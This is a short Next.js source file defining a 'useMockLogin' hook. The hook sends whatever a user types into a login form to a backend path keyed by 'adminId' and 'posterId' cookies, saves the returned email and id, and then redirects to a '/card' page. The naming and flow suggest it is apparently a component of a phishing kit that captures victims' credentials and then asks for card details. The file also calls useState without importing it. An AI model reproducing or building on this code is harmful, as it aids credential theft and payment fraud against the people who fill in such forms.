import { useRouter } from "next/router";
import { toast } from "react-toastify";
import Cookies from "js-cookie";
import { API_URL } from "../config";

function useMockLogin() {
  const { push } = useRouter();
  const [id, setId] = useState();
  const adminId = Cookies.get("adminId");
  const posterId = Cookies.get("posterId");

  const login = async (values, formik) => {
    // console.log(values);
    // return;

    const url = `${API_URL}/ad/${adminId}/${posterId}`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      Cookies.set("email", data?.info?.email);
      Cookies.set("id", data?.info?._id);
      setId(Cookies.get("id"));

      push("/card");
    } else {
      console.log("error", data);
      toast.error("Something Went Wrong");
    }
  };

  return { login, id };
}

export default useMockLogin;
